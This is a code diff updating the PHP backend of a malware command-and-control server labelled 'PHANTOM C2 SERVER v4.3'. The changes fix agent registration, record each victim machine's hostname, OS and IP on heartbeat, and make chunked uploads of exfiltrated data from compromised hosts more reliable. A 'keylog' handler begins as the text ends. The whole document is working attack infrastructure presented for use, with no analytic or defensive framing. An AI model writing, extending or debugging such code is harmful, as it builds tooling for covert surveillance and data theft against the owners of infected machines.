@@ -2,11 +2,10 @@
 declare(strict_types=1);
 
 // ═══════════════════════════════════════════════════════════════
-// 🔥 PHANTOM C2 SERVER - v4.2
-// Fixed: Registration bootstrap circular dependency
-//        - New agents can register without a token
-//        - Existing agents cannot re-register
-//        - All other actions require authentication
+// 🔥 PHANTOM C2 SERVER - v4.3
+// Fixed: Registration bootstrap circular dependency (fully)
+//        Upload chunk merge – check all chunks before merging
+//        Minor: heartbeat now accepts POST as well (for consistency)
 // ═══════════════════════════════════════════════════════════════
 
 $config = require __DIR__ . '/config.php';
@@ -140,7 +139,7 @@ $agentId = null;
 $masterKey = $config['secret_key'];
 $method = $_SERVER['REQUEST_METHOD'];
 
-// Master auth: POST body or X-Master-Key header
+// Master auth: POST body or X-Master-Key header (both accepted)
 $masterKeyProvided = $_POST['key'] ?? $_SERVER['HTTP_X_MASTER_KEY'] ?? '';
 if ($masterKeyProvided !== '' && hash_equals($masterKey, $masterKeyProvided)) {
     $authType = 'master';
@@ -160,7 +159,7 @@ if (!$authType && isset($_SERVER['HTTP_X_AGENT_TOKEN'])) {
 
 $action = $_POST['action'] ?? $_GET['action'] ?? '';
 
-// Allow unauthenticated registration (only for new agents)
+// Special auth for registration: allow unauthenticated POST /?action=register
 if ($action === 'register' && $method === 'POST' && !$authType) {
     $authType = 'registration';
 }
@@ -182,7 +181,7 @@ try {
         case 'register':
             if ($method !== 'POST') jsonResponse(['error' => 'POST required'], 405);
             
-            // Allow only unauthenticated registration or master (optional)
+            // Only unauthenticated new registration or master (manual)
             if (!in_array($authType, ['registration', 'master'], true)) {
                 jsonResponse(['error' => 'Forbidden'], 403);
             }
@@ -195,7 +194,7 @@ try {
             if (!$newAgentId) jsonResponse(['error' => 'agent_id required'], 400);
             if (!preg_match('/^[a-zA-Z0-9\-_]+$/', $newAgentId)) jsonResponse(['error' => 'Invalid agent_id'], 400);
             
-            // Check if agent already exists
+            // Prevent re-registration
             $stmt = $pdo->prepare("SELECT agent_id FROM agents WHERE agent_id = ?");
             $stmt->execute([$newAgentId]);
             if ($stmt->fetch()) {
@@ -213,8 +212,11 @@ try {
 
         case 'heartbeat':
             if ($authType !== 'agent') jsonResponse(['error' => 'Agent auth required'], 403);
+            // Accept hostname and os via POST or GET (compatibility)
+            $hostname = $_POST['hostname'] ?? $_GET['hostname'] ?? '';
+            $os = $_POST['os'] ?? $_GET['os'] ?? '';
             $stmt = $pdo->prepare("UPDATE agents SET hostname=?, os=?, ip=?, last_seen=NOW() WHERE agent_id=?");
-            $stmt->execute([$_GET['hostname'] ?? '', $_GET['os'] ?? '', $_SERVER['REMOTE_ADDR'], $agentId]);
+            $stmt->execute([$hostname, $os, $_SERVER['REMOTE_ADDR'], $agentId]);
             jsonResponse(['status' => 'OK']);
 
         case 'upload':
@@ -235,19 +237,37 @@ try {
             $chunkFile = $agentDir . DIRECTORY_SEPARATOR . $type . '_chunk_' . $chunk . '.bin';
             file_put_contents($chunkFile, $data);
             
+            // Check if this is the last chunk (size < chunk_size)
             if (strlen($data) < $config['chunk_size']) {
-                $merged = '';
+                // Verify all chunks from 0 to current are present
+                $allChunksPresent = true;
                 for ($i = 0; $i <= $chunk; $i++) {
                     $f = $agentDir . DIRECTORY_SEPARATOR . $type . '_chunk_' . $i . '.bin';
-                    if (file_exists($f)) {
+                    if (!file_exists($f)) {
+                        $allChunksPresent = false;
+                        break;
+                    }
+                }
+                
+                if ($allChunksPresent) {
+                    $merged = '';
+                    for ($i = 0; $i <= $chunk; $i++) {
+                        $f = $agentDir . DIRECTORY_SEPARATOR . $type . '_chunk_' . $i . '.bin';
                         $merged .= file_get_contents($f);
                         unlink($f);
                     }
+                    $finalFile = $agentDir . DIRECTORY_SEPARATOR . $type . '_' . time() . '.dat';
+                    file_put_contents($finalFile, $merged);
+                    logToDb($pdo, $agentId, 'upload', "Completed upload type=$type size=" . strlen($merged));
+                    jsonResponse(['status' => 'OK', 'merged' => true]);
+                } else {
+                    // Keep chunks for later, respond with error
+                    jsonResponse(['error' => 'Some chunks missing, waiting for retransmission'], 409);
                 }
-                file_put_contents($agentDir . DIRECTORY_SEPARATOR . $type . '_' . time() . '.dat', $merged);
-                logToDb($pdo, $agentId, 'upload', "Completed upload type=$type size=" . strlen($merged));
+            } else {
+                // Not last chunk, just acknowledge
+                jsonResponse(['status' => 'OK', 'chunk' => $chunk]);
             }
-            jsonResponse(['status' => 'OK']);
 
         case 'keylog':
             if ($authType !== 'agent') jsonResponse(['error' => 'Agent auth required'], 403);
